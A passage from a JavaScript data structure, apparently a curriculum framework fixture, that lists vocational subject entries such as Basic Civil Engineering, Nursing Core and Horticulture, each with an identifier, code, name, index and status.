          'index': 64,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_basiccivilengineering',
          'code': 'basiccivilengineering',
          'name': 'Basic Civil Engineering',
          'description': 'Basic Civil Engineering',
          'index': 65,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_basicautomobileengineering',
          'code': 'basicautomobileengineering',
          'name': 'Basic Automobile Engineering',
          'description': 'Basic Automobile Engineering',
          'index': 66,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_textilesdressdesigning',
          'code': 'textilesdressdesigning',
          'name': 'Textiles &  Dress Designing',
          'description': 'Textiles &  Dress Designing',
          'index': 67,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_nursingcore',
          'code': 'nursingcore',
          'name': 'Nursing Core',
          'description': 'Nursing Core',
          'index': 68,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_tourismandtravelmanagement',
          'code': 'tourismandtravelmanagement',
          'name': 'Tourism and Travel Management',
          'description': 'Tourism and Travel Management',
          'index': 69,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_horticulture',
          'code': 'horticulture',
          'name': 'Horticulture',
          'description': 'Horticulture',
          'index': 70,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_healthbeautystudies',
          'code': 'healthbeautystudies',
          'name': 'Health & Beauty Studies',
          'description': 'Health & Beauty Studies',
          'index': 71,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_secretarialpractices',
          'code': 'secretarialpractices',
          'name': 'Secretarial Practices',
          'description': 'Secretarial Practices',
          'index': 72,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_costaccountingtaxation',
          'code': 'costaccountingtaxation',
          'name': 'Cost Accounting & Taxation',
          'description': 'Cost Accounting & Taxation',
          'index': 73,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_animalsciencetechnology',
          'code': 'animalsciencetechnology',
          'name': 'Animal Science & Technology',
          'description': 'Animal Science & Technology',
          'index': 74,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        }
      ]
    }
  ]
};
